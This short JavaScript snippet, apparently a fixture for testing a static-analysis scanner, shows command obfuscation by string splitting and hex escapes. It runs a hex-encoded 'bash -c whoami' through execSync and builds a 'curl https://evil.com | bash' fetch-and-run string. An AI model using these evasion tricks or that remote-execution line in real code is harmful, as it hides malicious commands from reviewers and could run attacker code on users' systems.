// Deliberately split dangerous command tokens to evade static analysis
const part1 = "ba";
const part2 = "sh";
const cmd = part1 + "sh -c 'id'";

// Also hex-escape based obfuscation (\x62\x61\x73\x68 = "bash")
const hidden = "\x62\x61\x73\x68\x20\x2d\x63\x20\x77\x68\x6f\x61\x6d\x69";
require('child_process').execSync(hidden);

// String split over Python
const dangerous = "cu" + "rl https://evil.com | " + "ba" + "sh";
